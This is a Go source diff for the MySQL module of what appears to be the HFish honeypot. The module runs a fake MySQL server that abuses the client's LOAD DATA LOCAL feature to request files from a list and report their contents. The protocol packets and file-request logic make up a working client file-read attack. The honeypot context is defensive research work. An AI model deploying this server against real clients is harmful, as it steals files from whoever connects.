@@ -1,16 +1,15 @@
 package mysql
 
 import (
-	"bufio"
 	"bytes"
 	"encoding/binary"
-	"flag"
 	"fmt"
 	"log"
 	"net"
-	"os"
-	"strconv"
 	"syscall"
+	"strings"
+	"HFish/error"
+	"HFish/core/report"
 )
 
 //读取文件时每次读取的字节数
@@ -31,9 +30,6 @@ var GreetingData = []byte{
 //服务器第二个数据包认证成功的OK响应
 var OkData = []byte{0x07, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00}
 
-//配置文件，用于保存要读取的文件列表，默认当前目录下的mysql.ini，可自定义
-var configFile = ""
-
 //保存要读取的文件列表
 var fileNames []string
 
@@ -42,20 +38,23 @@ var recordClient = make(map[string]int)
 
 func Start(addr string, files string) {
 	fmt.Println("mysql启动...")
-	conf := flag.String("conf", "mysql.ini", "准备读取的客户端文件全路径，一行一个")
-	flag.Parse()
-	configFile = *conf
-	fileNames = readConfig()
-	listener := initMysqlServer(addr)
+
+	// 启动 Mysql 服务端
+	serverAddr, _ := net.ResolveTCPAddr("tcp", addr)
+	listener, _ := net.ListenTCP("tcp", serverAddr)
+
+	// 读取文件列表
+	fileNames = strings.Split(files, ",")
 
 	for {
-		conn, err := listener.Accept()
-		handleError(err, "Accept: ")
-		ip := getIp(conn)
+		conn, _ := listener.Accept()
+		ip, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
+
 		//由于文件最后保存的文件名包含ip地址，为了本地测试加了这个
 		if ip == "::1" {
 			ip = "localhost"
 		}
+
 		//这里记录每个客户端连接的次数，实现获取多个文件
 		_, ok := recordClient[ip]
 		if ok {
@@ -65,31 +64,26 @@ func Start(addr string, files string) {
 		} else {
 			recordClient[ip] = 0
 		}
+
 		go connectionClientHandler(conn)
 	}
-}
-
-//初始化服务器
-func initMysqlServer(hostAndPort string) net.Listener {
-	serverAddr, err := net.ResolveTCPAddr("tcp", hostAndPort)
-	handleError(err, "Resolving address:port failed: '"+hostAndPort+"'")
-	listener, err := net.ListenTCP("tcp", serverAddr)
-	handleError(err, "ListenTCP: ")
-	log.Println("Listening to: ", listener.Addr().String())
-	return listener
 }
 
 func connectionClientHandler(conn net.Conn) {
 	defer conn.Close()
 	connFrom := conn.RemoteAddr().String()
-	log.Println("Connection from: ", connFrom)
+
+	arr := strings.Split(connFrom, ":")
+	id := report.ReportMysql(arr[0], connFrom+" 已经连接")
+
 	var ibuf = make([]byte, bufLength)
 	//第一个包
 	_, err := conn.Write(GreetingData)
-	handleError(err, "Send one")
+	error.Check(err, "")
+
 	//第二个包
 	_, err = conn.Read(ibuf[0: bufLength-1])
-	handleError(err, "Read two")
+
 	//判断是否有Can Use LOAD DATA LOCAL标志，如果有才支持读取文件
 	if (uint8(ibuf[4]) & uint8(128)) == 0 {
 		_ = conn.Close()
@@ -98,27 +92,28 @@ func connectionClientHandler(conn net.Conn) {
 	}
 	//第三个包
 	_, err = conn.Write(OkData)
-	handleError(err, "Send three")
+
 	//第四个包
 	_, err = conn.Read(ibuf[0: bufLength-1])
-	handleError(err, "Read four")
+
 	//这里根据客户端连接的次数来选择读取文件列表里面的第几个文件
-	ip := getIp(conn)
+	ip, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
 	getFileData := []byte{byte(len(fileNames[recordClient[ip]]) + 1), 0x00, 0x00, 0x01, 0xfb}
 	getFileData = append(getFileData, fileNames[recordClient[ip]]...)
+
 	//第五个包
 	_, err = conn.Write(getFileData)
-	handleError(err, "Send five")
-	getRequestContent(conn)
+	getRequestContent(conn, id)
 }
 
 //获取客户端传来的文件数据
-func getRequestContent(conn net.Conn) {
+func getRequestContent(conn net.Conn, id int64) {
 	var content bytes.Buffer
 	//先读取数据包长度，前面3字节
 	lengthBuf := make([]byte, 3)
 	_, err := conn.Read(lengthBuf)
-	handleError(err, "Read data length")
+	error.Check(err, "")
+
 	totalDataLength := int(binary.LittleEndian.Uint32(append(lengthBuf, 0)))
 	if totalDataLength == 0 {
 		log.Println("Get no file and closed connection.")
@@ -142,7 +137,7 @@ func getRequestContent(conn net.Conn) {
 			totalReadLength += length
 			if totalReadLength == totalDataLength {
 				//读取完成保存到本地文件
-				saveContent(conn, content)
+				getFileContent(content, id)
 				//随便写点数据给客户端
 				_, _ = conn.Write(OkData)
 			}
@@ -156,44 +151,6 @@ func getRequestContent(conn net.Conn) {
 }
 
 //保存文件
-func saveContent(conn net.Conn, content bytes.Buffer) {
-	ip := getIp(conn)
-	fmt.Println("保存文件中.....", strconv.Itoa(recordClient[ip])+".txt")
-	saveName := ip + "-" + strconv.Itoa(recordClient[ip]) + ".txt"
-	outputFile, outputError := os.OpenFile(saveName, os.O_WRONLY|os.O_CREATE, 0666)
-	handleError(outputError, "Save content")
-	defer outputFile.Close()
-	outputWriter := bufio.NewWriter(outputFile)
-	_, writeErr := outputWriter.WriteString(content.String())
-	handleError(writeErr, "Write file")
-	_ = outputWriter.Flush()
-	return
-}
-
-//获取当前ip
-func getIp(conn net.Conn) string {
-	ip, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
-	return ip
-}
-
-//处理错误
-func handleError(error error, info string) {
-	if error != nil {
-		log.Printf(info + " error:" + error.Error() + "\n")
-	}
-}
-
-//读取文件列表
-func readConfig() []string {
-	var line []string
-	fileHandle, error := os.OpenFile(configFile, os.O_RDONLY, 0)
-	handleError(error, "Open config file")
-	defer fileHandle.Close()
-	sc := bufio.NewScanner(fileHandle)
-	/*default split the file use '\n'*/
-	for sc.Scan() {
-		line = append(line, sc.Text())
-	}
-	handleError(sc.Err(), "Read config file")
-	return line
+func getFileContent(content bytes.Buffer, id int64) {
+	report.ReportUpdateMysql(id, "&&"+content.String())
 }
